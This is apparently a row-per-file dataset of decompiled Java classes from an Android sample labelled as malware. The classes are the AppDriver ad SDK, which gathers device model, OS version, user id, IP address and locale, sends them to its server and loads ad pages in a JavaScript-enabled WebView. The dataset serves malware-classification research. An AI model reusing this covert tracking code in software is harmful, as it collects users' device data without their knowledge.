appDriverPromotionLayout.setItemName(extras.getString(AppDriverFactory.ITEM_NAME));         }         if (extras.getString(AppDriverFactory.ITEM_IMAGE) != null) {           appDriverPromotionLayout.setItemImage(extras.getString(AppDriverFactory.ITEM_IMAGE));         }       }     }     if (!appDriverPromotionLayout.getClickCampaign()) {       setContentView(appDriverPromotionLayout);     }     appDriverPromotionLayout.showPromotionView();     if (appDriverPromotionLayout.getClickCampaign()) {       finish();     }     l.a(this,this.a);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverFactory.code","public class AppDriverFactory {   public static final String CLICK_PROMOTION=""CLICK_PROMOTION"";   public static final String CROSS_MEDIA_ID=""CROSS_MEDIA_ID"";   public static final String IDENTIFIER=""IDENTIFIER"";   public static final String IS_CROSSWALL=""IS_CROSSWALL"";   public static final String IS_INTERSTITIAL=""IS_INTERSTITIAL"";   public static final String ITEM_IDENTIFIER=""ITEM_IDENTIFIER"";   public static final String ITEM_IMAGE=""ITEM_IMAGE"";   public static final String ITEM_NAME=""ITEM_NAME"";   public static final String ITEM_PRICE=""ITEM_PRICE"";   public static final String LANDSCAPE=""landscape"";   public static final String MEDIA_ID=""MEDIA_ID"";   public static final String ORIENTATION=""ORIENTATION"";   public static final String PORTRAIT=""portrait"";   public static final String PROMOTION_ID=""PROMOTION_ID"";   public static Class getCrossPromotionClass(  Context context){     try {       return Class.forName(""net.adways.appdriver.sdk.AppDriverCrossPromotionActivity"",true,context.getApplicationContext().getClassLoader());     }  catch (    ClassNotFoundException e) {       l.a(""AppDriverFactory"",""getPromotionClass"",e);       return null;     }   }   public static Class getPromotionClass(  Context context){     try {       return Class.forName(""net.adways.appdriver.sdk.AppDriverPromotionActivity"",true,context.getApplicationContext().getClassLoader());     }  catch (    ClassNotFoundException e) {       l.a(""AppDriverFactory"",""getPromotionClass"",e);       return null;     }   }   public static AppDriverPromotionOption getPromotionOptionInstance(){     return new AppDriverPromotionOption();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverLogEventExtra.code","public class AppDriverLogEventExtra implements Serializable {   public static final String COMMAND=""command"";   public static final String EX_OBJECT=""ex_object"";   public static final String FORCE_STOP_SESSION=""forceStopSession"";   public static final String LOG_ERROR=""logError"";   public static final String LOG_EVENT=""logEvent"";   public static final String LOG_EVENTS=""logEvents"";   public static final String START_SESSION=""startSession"";   public static final String STOP_SESSION=""stopSession"";   private String a;   private String b;   private String c;   protected Map mParams;   protected Throwable mThrowable;   public AppDriverLogEventExtra(  String str){     this.a=str;   }   public AppDriverLogEventExtra(  String str,  String str2,  Throwable th){     this.b=str;     this.c=str2;     this.mThrowable=th;   }   public AppDriverLogEventExtra(  String str,  Map map){     this.a=str;     this.mParams=map;   }   public final String a(){     return this.a;   }   public final Throwable m0a(){     return this.mThrowable;   }   public final Map m1a(){     return this.mParams;   }   public final String b(){     return this.b;   }   public final String c(){     return this.c;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverLogIntentService.code","public class AppDriverLogIntentService extends IntentService {   public AppDriverLogIntentService(){     super(""AppDriverLogIntentService"");   }   public AppDriverLogIntentService(  String str){     super(str);   }   @Override protected void onHandleIntent(  Intent intent){     String string;     Boolean bool;     if (l.m18b()) {       try {         Bundle extras=intent.getExtras();         if (extras == null || (string=extras.getString(AppDriverLogEventExtra.COMMAND)) == null) {           return;         }         if (string.equals(AppDriverLogEventExtra.START_SESSION)) {           b.a();           return;         }         if (string.equals(AppDriverLogEventExtra.LOG_EVENT)) {           b.a(((AppDriverLogEventExtra)extras.getSerializable(AppDriverLogEventExtra.EX_OBJECT)).a());           return;         }         if (string.equals(AppDriverLogEventExtra.LOG_EVENTS)) {           AppDriverLogEventExtra appDriverLogEventExtra=(AppDriverLogEventExtra)extras.getSerializable(AppDriverLogEventExtra.EX_OBJECT);           b.a(appDriverLogEventExtra.a(),appDriverLogEventExtra.m1a());           return;         }         if (string.equals(AppDriverLogEventExtra.LOG_ERROR)) {           AppDriverLogEventExtra appDriverLogEventExtra2=(AppDriverLogEventExtra)extras.getSerializable(AppDriverLogEventExtra.EX_OBJECT);           b.a(appDriverLogEventExtra2.b(),appDriverLogEventExtra2.c(),appDriverLogEventExtra2.m0a());           return;         }         if (!string.equals(AppDriverLogEventExtra.STOP_SESSION)) {           if (string.equals(AppDriverLogEventExtra.FORCE_STOP_SESSION)) {             b.b();             return;           }           return;         }         List<ActivityManager.RunningAppProcessInfo> runningAppProcesses=((ActivityManager)getSystemService(""activity"")).getRunningAppProcesses();         int myPid=Process.myPid();         Iterator<ActivityManager.RunningAppProcessInfo> it=runningAppProcesses.iterator();         while (true) {           if (!it.hasNext()) {             bool=true;             break;           }  else {             ActivityManager.RunningAppProcessInfo next=it.next();             if (next.pid == myPid) {               bool=next.importance == 100;             }           }         }         if (bool.booleanValue()) {           return;         }         b.b();       }  catch (      NullPointerException e) {         l.a(""AppDriverLogIntentService"",""null pointer error"",e);       }     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverLogIntentServiceClient.code","public final class AppDriverLogIntentServiceClient {   private static Context a=f.f13a;   public static void forceStopSession(){     if (a == null) {       return;     }     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.FORCE_STOP_SESSION);     a.startService(intent);   }   public static void logError(  String str,  String str2,  Throwable th){     if (a == null) {       return;     }     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.LOG_ERROR);     intent.putExtra(AppDriverLogEventExtra.EX_OBJECT,new AppDriverLogEventExtra(str,str2,th));     a.startService(intent);   }   public static void logEvent(  String str){     if (a == null) {       return;     }     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.LOG_EVENT);     intent.putExtra(AppDriverLogEventExtra.EX_OBJECT,new AppDriverLogEventExtra(str));     a.startService(intent);   }   public static void logEvent(  String str,  Map map){     if (a == null) {       return;     }     AppDriverLogEventExtra appDriverLogEventExtra=new AppDriverLogEventExtra(str,map);     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.LOG_EVENTS);     intent.putExtra(AppDriverLogEventExtra.EX_OBJECT,appDriverLogEventExtra);     a.startService(intent);   }   public static void startSession(){     if (a == null) {       return;     }     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.START_SESSION);     a.startService(intent);   }   public static void stopSession(){     if (a == null) {       return;     }     Intent intent=new Intent(a,(Class<?>)AppDriverLogIntentService.class);     intent.putExtra(AppDriverLogEventExtra.COMMAND,AppDriverLogEventExtra.STOP_SESSION);     a.startService(intent);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverPromotionActivity.code","public class AppDriverPromotionActivity extends Activity {   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     if (!l.m18b()) {       finish();       return;     }     requestWindowFeature(1);     Bundle extras=getIntent().getExtras();     AppDriverPromotionLayout appDriverPromotionLayout=new AppDriverPromotionLayout(this);     if (extras != null) {       if (extras.getInt(AppDriverFactory.MEDIA_ID) != 0) {         appDriverPromotionLayout.setMediaId(extras.getInt(AppDriverFactory.MEDIA_ID));       }       if (extras.getInt(AppDriverFactory.PROMOTION_ID,0) != 0) {         appDriverPromotionLayout.setCampaignId(extras.getInt(AppDriverFactory.PROMOTION_ID));         if (extras.getBoolean(AppDriverFactory.CLICK_PROMOTION,false)) {           appDriverPromotionLayout.a(extras.getBoolean(AppDriverFactory.CLICK_PROMOTION));         }       }       if (extras.getString(AppDriverFactory.IDENTIFIER) != null) {         appDriverPromotionLayout.setIdentifier(extras.getString(AppDriverFactory.IDENTIFIER));       }       if (extras.getString(AppDriverFactory.ITEM_IDENTIFIER) != null) {         appDriverPromotionLayout.setItemIdentifier(extras.getString(AppDriverFactory.ITEM_IDENTIFIER));         if (extras.getInt(AppDriverFactory.ITEM_PRICE,0) != 0) {           appDriverPromotionLayout.setItemPrice(extras.getInt(AppDriverFactory.ITEM_PRICE));         }         if (extras.getString(AppDriverFactory.ITEM_NAME) != null) {           appDriverPromotionLayout.setItemName(extras.getString(AppDriverFactory.ITEM_NAME));         }         if (extras.getString(AppDriverFactory.ITEM_IMAGE) != null) {           appDriverPromotionLayout.setItemImage(extras.getString(AppDriverFactory.ITEM_IMAGE));         }       }     }     if (!appDriverPromotionLayout.getClickCampaign()) {       appDriverPromotionLayout.setOrientation(1);       setContentView(appDriverPromotionLayout);     }     appDriverPromotionLayout.showPromotionView();     if (appDriverPromotionLayout.getClickCampaign()) {       finish();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverPromotionLayout.code","public class AppDriverPromotionLayout extends LinearLayout {   private int a;   private Context f0a;   private WebView f1a;   private String f2a;   private boolean f3a;   private int b;   private String f4b;   private boolean f5b;   private int c;   private String f6c;   private boolean f7c;   private int d;   private String f8d;   private String e;   public AppDriverPromotionLayout(  Context context){     super(context);     this.f3a=false;     this.f5b=false;     this.f2a=null;     this.a=0;     this.f4b="""";     this.f6c="""";     this.c=0;     this.f8d="""";     this.e="""";     this.d=0;     this.f7c=false;     a(context);   }   public AppDriverPromotionLayout(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.f3a=false;     this.f5b=false;     this.f2a=null;     this.a=0;     this.f4b="""";     this.f6c="""";     this.c=0;     this.f8d="""";     this.e="""";     this.d=0;     this.f7c=false;     a(context);   }   private String a(  String str){     TreeMap treeMap=new TreeMap();     treeMap.put(AppDriverFactory.IDENTIFIER.toLowerCase(),this.f4b);     if (isCrossPromoAdvertisement()) {       treeMap.put(AppDriverFactory.CROSS_MEDIA_ID.toLowerCase(),String.valueOf(getCrossMediaId()));     }  else {       treeMap.put(AppDriverFactory.MEDIA_ID.toLowerCase(),String.valueOf(this.b));     }     treeMap.put(""user"",f.b());     treeMap.put(""model"",Build.MODEL);     treeMap.put(""system"",Build.VERSION.RELEASE);     treeMap.put(""sdk"",""4.6.3"");     treeMap.put(""app"",f.d);     if (this.f6c.length() != 0 && this.c > 0) {       treeMap.put(AppDriverFactory.ITEM_IDENTIFIER.toLowerCase(),this.f6c);       treeMap.put(AppDriverFactory.ITEM_PRICE.toLowerCase(),String.valueOf(this.c));       treeMap.put(AppDriverFactory.ITEM_NAME.toLowerCase(),this.f8d);       treeMap.put(AppDriverFactory.ITEM_IMAGE.toLowerCase(),this.e);     }     if (this.d != 0 && (str.equals(""i"") || str.equals(""c"") || isCrossPromoAdvertisement())) {       treeMap.put(""CAMPAIGN_ID"".toLowerCase(),String.valueOf(this.d));       if (str.equals(""i"")) {         str=""r"";       }     }     if (f.f16a) {       treeMap.put(""privileged"",""1"");     }     if (isCrossPromoAdvertisement()) {       treeMap.put(AppDriverFactory.ORIENTATION.toLowerCase(),getISOrientationVal());     }     String a=l.a(treeMap,f.f15a);     return str.equals(""c"") ? String.valueOf(l.a()) + ""3.0."" + f.a+ str+ ""?""+ a : isCrossPromoAdvertisement() ? String.valueOf(l.a()) + ""3.0."" + f.a+ str+ ""?""+ a : String.valueOf(l.a()) + ""3.1."" + f.a+ str+ ""?""+ a;   }   private void a(){     String a;     d dVar=new d(this);     dVar.execute(new Object[0]);     try {       if (!((Boolean)dVar.get()).booleanValue()) {         Toast.makeText(this.f0a,""connection\u3000failed."",0).show();         return;       }       this.f1a.getSettings().setBuiltInZoomControls(true);       this.f1a.getSettings().setJavaScriptEnabled(true);       if (isCrossWall()) {         a=a(""xi"");         this.f1a.getSettings().setLoadWithOverviewMode(true);         this.f1a.getSettings().setUseWideViewPort(true);       }  else       if (isInterstitial()) {         a=a(""si"");         this.f1a.setBackgroundColor(Color.alpha(0));         this.f1a.getSettings().setLoadWithOverviewMode(true);         this.f1a.getSettings().setUseWideViewPort(true);       }  else {         a=a(""i"");       }       l.b(""promotionUrl: "",a);       this.f1a.loadUrl(a);       this.f1a.setScrollBarStyle(33554432);     }  catch (    InterruptedException e) {       l.c(""AppDriverPromotionLayout"",""connection\u3000failed."" + e);     } catch (    ExecutionException e2) {       l.c(""AppDriverPromotionLayout"",""connection\u3000failed."" + e2);     }   }   private void a(  Context context){     if (l.m18b()) {       setOrientation(1);       this.f0a=context;       setLayoutParams(new LinearLayout.LayoutParams(-1,-1));       this.f1a=new WebView(context);       addView(this.f1a,new LinearLayout.LayoutParams(-1,-1));     }   }   public static void m2a(  AppDriverPromotionLayout appDriverPromotionLayout){     if (appDriverPromotionLayout.f0a instanceof AppDriverPromotionActivity) {       ((AppDriverPromotionActivity)appDriverPromotionLayout.f0a).finish();     }  else     if (appDriverPromotionLayout.f0a instanceof AppDriverCrossPromotionActivity) {       ((AppDriverCrossPromotionActivity)appDriverPromotionLayout.f0a).finish();     }  else {       appDriverPromotionLayout.removeAllViews();     }   }   public static boolean m3a(){     DefaultHttpClient defaultHttpClient=new DefaultHttpClient();     HttpParams params=defaultHttpClient.getParams();     HttpConnectionParams.setConnectionTimeout(params,5000);     HttpConnectionParams.setSoTimeout(params,5000);     try {       int statusCode=defaultHttpClient.execute(new HttpGet(l.a())).getStatusLine().getStatusCode();       if (statusCode == 200) {         return true;       }       l.c(""AppDriverPromotionLayout"",""connection\u3000failed. status: "" + statusCode);       return false;     }  catch (    ClientProtocolException e) {       l.a(""AppDriverPromotionLayout"",""connection\u3000failed."",e);       return false;     } catch (    IOException e2) {       l.a(""AppDriverPromotionLayout"",""connection\u3000failed."",e2);       return false;     }   }   public final void a(  boolean z){     this.f7c=z;   }   public boolean getClickCampaign(){     return this.f7c;   }   public int getCrossMediaId(){     return this.a;   }   public String getISOrientationVal(){     return this.f2a;   }   public boolean isCrossPromoAdvertisement(){     return isCrossWall() || isInterstitial();   }   public boolean isCrossWall(){     return this.f3a;   }   public boolean isInterstitial(){     return this.f5b;   }   public void setCampaignId(  int i){     this.d=i;   }   public void setCrossMediaId(  int i){     this.a=i;   }   public void setCrossWall(  Boolean bool){     this.f3a=bool.booleanValue();   }   public void setISOrientationVal(  String str){     this.f2a=str;   }   public void setIdentifier(  String str){     this.f4b=str;   }   public void setInterstitial(  Boolean bool){     this.f5b=bool.booleanValue();   }   public void setItemIdentifier(  String str){     this.f6c=str;   }   public void setItemImage(  String str){     this.e=str;   }   public void setItemName(  String str){     this.f8d=str;   }   public void setItemPrice(  int i){     this.c=i;   }   public void setMediaId(  int i){     this.b=i;   }   public void setPromotionId(  int i){     this.d=i;   }   public void showPromotionView(){     if (l.m18b()) {       setVisibility(0);       if (!this.f7c) {         this.f1a.setWebViewClient(new c(this));         a();         return;       }       String a=a(""c"");       l.b(""clickUrl: "",a);       Intent intent=new Intent();       intent.setAction(""android.intent.action.VIEW"");       intent.setData(Uri.parse(a));       this.f0a.startActivity(intent);     }   }   public void showPromotionView(  int i,  String str){     setMediaId(i);     setIdentifier(str);     showPromotionView();   }   public void showPromotionView(  Animation animation){     showPromotionView();     startAnimation(animation);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverPromotionOption.code","public class AppDriverPromotionOption {   private int a;   private int b=0;   public Integer a(){     int i=-1;     DefaultHttpClient defaultHttpClient=new DefaultHttpClient();     HttpParams params=defaultHttpClient.getParams();     HttpConnectionParams.setConnectionTimeout(params,10000);     HttpConnectionParams.setSoTimeout(params,10000);     TreeMap treeMap=new TreeMap();     treeMap.put(AppDriverFactory.MEDIA_ID.toLowerCase(),String.valueOf(this.a));     treeMap.put(""user"",f.b());     treeMap.put(""CAMPAIGN_ID"".toLowerCase(),String.valueOf(this.b));     treeMap.put(""sdk"",""4.6.3"");     treeMap.put(""app"",f.d);     String str="""" + l.a() + ""3.0.""+ f.a+ ""la?""+ l.a(treeMap,f.f15a);     l.b(""actionStatusUrl: "",str);     try {       HttpResponse execute=defaultHttpClient.execute(new HttpGet(str));       int statusCode=execute.getStatusLine().getStatusCode();       l.b(""action status: "",String.valueOf(statusCode));       if (statusCode != 200) {         return i;       }       if (execute.getEntity().getContentLength() <= 0) {         return null;       }       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(execute.getEntity().getContent()));       StringBuilder sb=new StringBuilder();       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           try {             return Integer.valueOf(sb.toString());           }  catch (          NumberFormatException e) {             l.a(""AppDriverPromotionOption"",""getActionStatus"",e);             return i;           }         }         sb.append(readLine);       }     }  catch (    ClientProtocolException e2) {       l.a(""AppDriverPromotionOption"",""getActionStatus"",e2);       return i;     } catch (    IOException e3) {       l.a(""AppDriverPromotionOption"",""getActionStatus"",e3);       return i;     }   }   public Integer getActionStatus(  int i,  int i2){     this.a=i;     this.b=i2;     if (l.m18b() && l.m16a()) {       e eVar=new e(this);       eVar.execute(new Object[0]);       try {         return (Integer)eVar.get();       }  catch (      InterruptedException e) {         l.a(""AppDriverPromotionOption"",""getActionStatus"",e);         return -1;       } catch (      ExecutionException e2) {         l.a(""AppDriverPromotionOption"",""getActionStatus"",e2);       }     }     return -1;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverTracker.code","public final class AppDriverTracker {   public static final int ANALYTICS_MODE=4;   public static final int DEFAULT_MODE=3;   public static final int GYRO_MODE=2;   public static final int PROMOTION_MODE=1;   public static final int SETTING_MODE=0;   private static boolean a=false;   private static void a(){     for (    File file : f.f13a.getFilesDir().listFiles(l.a("".*install(?!.*cid).*sendComplete""))) {       f.f13a.deleteFile(file.getName());     }   }   public static void actionComplete(  Context context,  String str){     new g(context,new Handler(),str).start();   }   public static void childActionComplete(  String str){     childActionComplete(str,""install"");   }   public static void childActionComplete(  String str,  String str2){     new g(new Handler(),str,str2).start();   }   public static boolean isUnity(){     return a;   }   public static void paymentComplete(  String str,  String str2,  float f,  int i,  String str3){     new g(str,str2,f,i,str3).start();   }   public static void requestAppDriver(  Context context,  int i,  String str){     requestAppDriver(context,i,str,3);   }   public static void requestAppDriver(  Context context,  int i,  String str,  int i2){     requestAppDriver(context,i,str,i2,null);   }   public static void requestAppDriver(  Context context,  int i,  String str,  int i2,  String str2){     requestAppDriver(context,i,str,i2,str2,null);   }   public static void requestAppDriver(  Context context,  int i,  String str,  int i2,  String str2,  String str3){     Uri data;     String queryParameter;     f.a(i,str,context.getApplicationContext());     f.a(str2);     try {       if ((context instanceof Activity) && (data=((Activity)context).getIntent().getData()) != null && (queryParameter=data.getQueryParameter(""click_id"")) != null) {         l.b(""AppDriverTracker"",""click_id: "" + queryParameter);         a();         l.d(""appdriver_click_id"",queryParameter);       }     }  catch (    ClassCastException e) {     } catch (    NullPointerException e2) {     } catch (    UnsupportedOperationException e3) {     }     if (isUnity()) {       new g(context,new Handler(Looper.getMainLooper()),i2,str3).start();     }  else {       new g(context,new Handler(),i2,str3).start();     }   }   public static void setDevMode(  boolean z){     f.b(Boolean.valueOf(z));   }   public static void setRefresh(  int i,  String str){     f.a(i,str);   }   public static void setTestMode(  boolean z){     f.a(Boolean.valueOf(z));   }   public static void setUnityFlag(  boolean z){     a=z;   }   public static void setVerboseMode(  boolean z){     f.c(Boolean.valueOf(z));   }   public static void targetCancel(  String str){     new g(2,str).start();   }   public static void targetComplete(  String str){     new g(1,str).start();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\Version.code","public class Version {   public static void main(  String[] strArr){     InputStream inputStream=null;     try {       try {         try {           String externalForm=Version.class.getResource(String.valueOf(Version.class.getSimpleName()) + "".class"").toExternalForm();           inputStream=new URL(String.valueOf(externalForm.substring(0,externalForm.lastIndexOf(Version.class.getName().replace(""."",""/"")))) + ""META-INF/MANIFEST.MF"").openStream();           String value=new Manifest(inputStream).getMainAttributes().getValue(""Built-Date"");           System.out.println(""Version : 4.6.3"");           System.out.println(""Built-Date: "" + value);         }  catch (        IOException e) {           e.printStackTrace();           try {             inputStream.close();           }  catch (          IOException e2) {             e2.printStackTrace();           }         }       }  catch (      FileNotFoundException e3) {         e3.printStackTrace();         try {           inputStream.close();         }  catch (        IOException e4) {           e4.printStackTrace();         }       } catch (      MalformedURLException e5) {         e5.printStackTrace();         try {           inputStream.close();         }  catch (        IOException e6) {           e6.printStackTrace();         }       }     }   finally {       try {         inputStream.close();       }  catch (      IOException e7) {         e7.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\a.code","public final class a extends Exception {   public a(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\b.code","public final class b {   private static b a=null;   private String f9a;   private List f10a=new ArrayList();   private JSONArray f11a;   private JSONObject f12a;   private String b;   private b(){   }   public static void a(){     if (a != null) {       l.c(""AppDriverISLogEvent"",""session is already started."");       return;     }     l.b(""AppDriverISLogEvent"",""start session."");     a=new b();     try {       b bVar=a;       bVar.b=k.a();       a.d();       l.b(""AppDriverISLogEvent"",""lastIp: "" + bVar.b);       a(""Session Start"",null);       a.c();     }  catch (    a e) {       a=null;       l.c(""AppDriverISLogEvent"",""startSession failed."");     } catch (    Exception e2) {       a=null;       l.c(""AppDriverISLogEvent"",""startSession failed."");     }   }   public static void a(  String str){     a(str,null);   }   public static void a(  String str,  String str2,  Throwable th){     if (a == null) {       l.c(""AppDriverISLogEvent"",""The session is not yet started."");       return;     }     HashMap hashMap=new HashMap();     hashMap.put(""errID"",str);     hashMap.put(""message"",str2);     hashMap.put(""name"",th.toString());     hashMap.put(""reason"",th.getMessage());     a(""Error"",hashMap);     l.a(""AppDriverISLogEvent"",AppDriverLogEventExtra.LOG_ERROR,th);   }   public static void a(  String str,  Map map){     if (a == null) {       l.c(""AppDriverISLogEvent"",""The session is not yet started."");       return;     }     try {       b bVar=a;       String format=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss Z"").format(new Date());       JSONObject jSONObject=new JSONObject();       try {         jSONObject.put(""event"",str);         jSONObject.put(""timestamp"",format);         l.b(""AppDriverISLogEvent"",""event: "" + str);         l.b(""AppDriverISLogEvent"",""timestamp: "" + format);         if (map != null) {           jSONObject.put(""info"",new JSONObject(map));         }         bVar.f11a.put(jSONObject);         l.b(""AppDriverISLogEvent"",""eventListNow: "" + bVar.f11a);         k.a(bVar.f12a,bVar.f9a);       }  catch (      JSONException e) {         throw new a(e);       }     }  catch (    a e2) {       l.a(""AppDriverISLogEvent"",""The session is not yet started."",e2);     }   }   private void a(  List list){     StringBuilder sb=new StringBuilder(l.a());     sb.append(""r"");     sb.append(""?"");     ArrayList arrayList=new ArrayList();     Iterator it=list.iterator();     while (it.hasNext()) {       JSONObject jSONObject=(JSONObject)it.next();       try {         String string=jSONObject.getString(""session_id"");         if (this.f9a != null && this.f9a.equals(string)) {           jSONObject.put(""is_incompleted"",""1"");         }       }  catch (      JSONException e) {         l.a(""AppDriverISLogEvent"",""doInBackground"",e);       }       l.b(""AppDriverISLogEvent"",""send data: "" + jSONObject.toString());       arrayList.add(new BasicNameValuePair(""data"",jSONObject.toString()));     }     l.b(""AppDriverISLogEvent"",""postData: "" + sb.toString());     try {       String sb2=sb.toString();       if (f.f14a != null) {         DefaultHttpClient defaultHttpClient=new DefaultHttpClient();         HttpParams params=defaultHttpClient.getParams();         HttpConnectionParams.setConnectionTimeout(params,10000);         HttpConnectionParams.setSoTimeout(params,10000);         HttpPost httpPost=new HttpPost(sb2.toString());         try {           httpPost.setEntity(new UrlEncodedFormEntity(arrayList,""UTF-8""));           try {             HttpResponse execute=defaultHttpClient.execute(httpPost);             int statusCode=execute.getStatusLine().getStatusCode();             l.b(""AppDriverISLogEvent"",""send status: "" + statusCode);             if (statusCode != 200) {               l.c(""AppDriverISLogEvent"",""send data failed."");             }  else {               String entityUtils=EntityUtils.toString(execute.getEntity(),""UTF-8"");               l.b(""AppDriverISLogEvent"",""send data succeed. response: "" + entityUtils);               k.a(entityUtils,this.f12a);               l.b(""AppDriverISLogEvent"",""sidSendList size is "" + this.f10a.size());               if (this.f9a != null) {                 this.f10a.remove(this.f10a.size() - 1);               }               k.b(this.f10a);             }           }  catch (          ClientProtocolException e2) {             throw new a(e2);           } catch (          IOException e3) {             throw new a(e3);           } catch (          JSONException e4) {             throw new a(e4);           }         }  catch (        UnsupportedEncodingException e5) {           throw new a(e5);         }       }     }  catch (    a e6) {       l.a(""AppDriverISLogEvent"",""doInBackground"",e6);     }     list.clear();   }   public static void b(){     if (a == null) {       l.c(""AppDriverISLogEvent"",""session is not yet started."");       return;     }     a(""Session Stop"",null);     try {       b bVar=a;       JSONArray names=bVar.f12a.names();       int i=0;       while (true) {         int i2=i;         if (i2 >= names.length()) {           bVar.f9a=null;           bVar.f11a=null;           bVar.b=null;           bVar.f10a.clear();           a.c();           a=null;           return;         }         try {           bVar.f12a.get((String)names.get(i2));           i=i2 + 1;         }  catch (        JSONException e) {           throw new a(e);         }       }     }  catch (    a e2) {       l.a(""AppDriverISLogEvent"",AppDriverLogEventExtra.STOP_SESSION,e2);     }   }   private void c(){     int i;     int i2=0;     List m7a=k.m7a();     int size=m7a.size();     if (size > 10) {       size=10;     }     ArrayList arrayList=new ArrayList();     ArrayList arrayList2=new ArrayList();     int i3=0;     while (i3 < size) {       String str=(String)m7a.get(i3);       String a2=k.a(str);       if (a2 == null) {         i=i2 + 1;       }  else {         arrayList2.add(str);         try {           JSONObject jSONObject=new JSONObject(a2);           StringBuilder sb=new StringBuilder();           String string=jSONObject.getString(""session_id"");           sb.append(string);           sb.append("","");           sb.append(f.f15a);           jSONObject.put(""digest"",l.m13a(sb.toString()));           arrayList.add(jSONObject);           l.b(""AppDriverISLogEvent"",""addSessionItem "" + string);           this.f10a.add(string);           i=i2;         }  catch (        JSONException e) {           throw new a(e);         }       }       i3++;       i2=i;     }     if (i2 > 0) {       arrayList2.add(this.f9a);       k.a(arrayList2);     }     m7a.clear();     a(arrayList);   }   private void d(){     this.f9a=l.c();     String str=this.f9a;     try {       FileOutputStream openFileOutput=f.f13a.openFileOutput(""appdriver_session.list"",32768);       PrintWriter printWriter=new PrintWriter(new OutputStreamWriter(openFileOutput,""UTF-8""));       printWriter.append((CharSequence)(String.valueOf(str) + ""\n""));       printWriter.close();       openFileOutput.close();     }  catch (    FileNotFoundException e) {       l.a(""LogEventFileUtils"",""appendSessionId"",e);     } catch (    UnsupportedEncodingException e2) {       l.a(""LogEventFileUtils"",""appendSessionId"",e2);     } catch (    IOException e3) {       l.a(""LogEventFileUtils"",""appendSessionId"",e3);     } catch (    NullPointerException e4) {       l.a(""LogEventFileUtils"",""appendSessionId"",e4);     }     this.f11a=new JSONArray();     this.f12a=new JSONObject();     try {       this.f12a.put(""session_id"",this.f9a);       this.f12a.put(""SITE_ID"".toLowerCase(),f.a);       this.f12a.put(""user"",f.e);       this.f12a.put(""model"",Build.MODEL);       this.f12a.put(""system"",Build.VERSION.RELEASE);       this.f12a.put(""ip"",this.b);       this.f12a.put(""version"",""3.2"");       this.f12a.put(""sdk"",""4.6.3"");       this.f12a.put(""app"",f.d);       this.f12a.put(""locale"",Locale.getDefault().toString());       this.f12a.put(""event"",this.f11a);       if (f.f16a) {         this.f12a.put(""privileged"",""1"");       }     }  catch (    JSONException e5) {       throw new a(e5);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk.compress\c.code","public final class c extends WebViewClient {   private AppDriverPromotionLayout a;   public c(  AppDriverPromotionLayout appDriverPromotionLayout){     this.a=appDriverPromotionLayout;   }   @Override public final boolean shouldOverrideUrlLoading(  WebView webView,  String str){     Context context;     l.b(""exitUrl"",str);     if (str.equals(""command://exit"")) {       AppDriverPromotionLayout.m2a(this.a);       return true;     }     if ((str.startsWith(""appdriver://"") || str.startsWith(""appdrivers://"")) ? false : true) {       return false;     }     String str2=null;     if (str.startsWith(""appdriver://"")) {       str2=str.replace(""appdriver://"",""http://"");     }  else     if (str.startsWith(""appdrivers://"")) {       str2=str.replace(""appdrivers://"",""https://"");     }  else {       l.c(""Invalid URL: "",str);     }     Intent intent=new Intent();     intent.setAction(""android.intent.action.VIEW"");     intent.setData(Uri.parse(str2));     context=this.a.f0a;     context.startActivity(intent);     return true;   } } "
